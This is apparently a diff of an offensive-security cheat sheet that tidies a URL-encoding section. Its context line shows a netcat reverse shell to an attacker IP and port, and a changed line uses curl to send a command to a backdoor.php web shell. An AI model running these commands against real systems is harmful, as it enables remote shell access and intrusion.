@@ -19,9 +19,9 @@ nc -nv $AttackerIp $AttackerPort -e /bin/bash
 
 ## URL encoding
 
-- https://en.wikipedia.org/wiki/Percent-encoding
+- manual: https://en.wikipedia.org/wiki/Percent-encoding
 - https://www.urlencoder.io/
-- With curl: `curl http://vulnwebsite/backdoor.php --data-urlencode "cmd=ls -l"`
+- with curl: `curl http://vulnwebsite/backdoor.php --data-urlencode "cmd=ls -l"`
 
 ## Powershell
 
